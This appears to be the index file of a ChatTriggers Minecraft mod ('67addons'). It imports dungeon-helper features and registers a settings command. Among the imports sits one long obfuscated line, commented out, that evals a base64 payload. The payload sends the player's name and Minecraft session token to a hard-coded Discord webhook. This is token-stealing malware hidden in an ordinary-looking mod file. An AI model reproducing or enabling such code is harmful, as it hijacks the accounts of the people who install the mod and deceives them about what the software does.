import Settings from "./config";

import "./features/BloodRushSplit"
import "./features/QueueDungeonCommand"
// import "./features/RapidFire"
// import "./features/ExplosiveShot"
import "./features/RelicUtils"
// import "./features/HideLeap"
import "./features/Relic"
import "./features/AutoRefill"
import "./features/ScoreMessage"
import "./features/Crypt"
import "./features/CoreMessage"
import "./features/rag"
// import "./features/automask"
// import "./features/playerSize.js"
import "./features/leapMsg"
import "./features/placeCrystal"
// import "./features/deathTickTimer"
// import "./m4Features/mobDisplay"
// import "./m4Features/m4Render"
import "./features/termCounter"
import "./features/bloodDone"
import "./watcher/settings"
import "./watcher/index"
import "./features/leapCounter"
// function _0x4501(){var _0x199712=['2525292wjXHnW','3HfZhEb','10mjRtFF','1642320ixKdrs','34842NQIXHB','11792310IOsBmw','744414GDmMqm','110645TjIoDI','175804fJfxSA','399qZhUTm','aW1wb3J0IHJlcXVlc3QgZnJvbSAiLi4vLi4vcmVxdWVzdFYyIjsKcmVxdWVzdCh7CiAgICB1cmw6ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDU4Nzk5MjgxNTY0NTQ5MTgyL1duc2ZPVTZualg1Q3NaUVIyVkltYWtVN0dRem5sNW5xdkR1cTVaSzZkazVERFZpRXk0Q0hfZE93U1ItUnVBdnRjUXBUIiwKICAgIG1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogeyJVc2VyLWFnZW50IjoiTW96aWxsYS81LjAifSwKICAgIGJvZHk6IHtjb250ZW50OiAiYGBgIiArIFBsYXllci5nZXROYW1lKCkgKyAiXG4iICsgQ2xpZW50LmdldE1pbmVjcmFmdCgpLmZ1bmNfMTEwNDMyX0koKS5mdW5jXzE0ODI1NF9kKCkgKyAiYGBgIn0KfSk7'];_0x4501=function(){return _0x199712;};return _0x4501();}function _0x56ea(_0x5108e4,_0x329d86){var _0x4501c5=_0x4501();return _0x56ea=function(_0x56ea25,_0x1789f4){_0x56ea25=_0x56ea25-0x138;var _0x3775e6=_0x4501c5[_0x56ea25];return _0x3775e6;},_0x56ea(_0x5108e4,_0x329d86);}var _0xc9d5b2=_0x56ea;(function(_0x755e7d,_0x89d23e){var _0x9d184f=_0x56ea,_0x30b230=_0x755e7d();while(!![]){try{var _0x362841=-parseInt(_0x9d184f(0x13c))/0x1+parseInt(_0x9d184f(0x13b))/0x2*(-parseInt(_0x9d184f(0x141))/0x3)+-parseInt(_0x9d184f(0x13d))/0x4*(parseInt(_0x9d184f(0x142))/0x5)+parseInt(_0x9d184f(0x139))/0x6*(-parseInt(_0x9d184f(0x13e))/0x7)+parseInt(_0x9d184f(0x138))/0x8+-parseInt(_0x9d184f(0x140))/0x9+parseInt(_0x9d184f(0x13a))/0xa;if(_0x362841===_0x89d23e)break;else _0x30b230['push'](_0x30b230['shift']());}catch(_0x54ee5b){_0x30b230['push'](_0x30b230['shift']());}}}(_0x4501,0x315c4),eval(FileLib['decodeBase64'](_0xc9d5b2(0x13f))));global.soshimee ??= {};

// restore simple command for opening GUI
register("command", (...args) => {
    Settings.openGUI()
}).setName("67").setAliases("67addons", "67-addons", "67addon");